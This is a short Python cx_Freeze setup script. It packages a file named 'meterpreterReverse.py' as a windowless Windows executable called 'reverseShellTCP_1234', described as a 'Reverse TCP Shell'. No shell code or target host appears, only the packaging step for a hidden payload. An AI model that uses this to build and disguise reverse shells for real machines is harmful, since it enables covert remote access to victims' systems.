import sys
from cx_Freeze import setup, Executable

base = None
if sys.platform == 'win32' : base ='Win32GUI'

opts = {'include_files':['logo.gif'], 'includes' : ['re']}

setup(
    name = "reverseShellTCP_1234",
    version = "1.0",
    description = "Reverse TCP Shell",
    author = "HexiBurner",
    options = {'build_exe' :opts},
    executables = [ Executable ( 'meterpreterReverse.py' , base = base ) ] )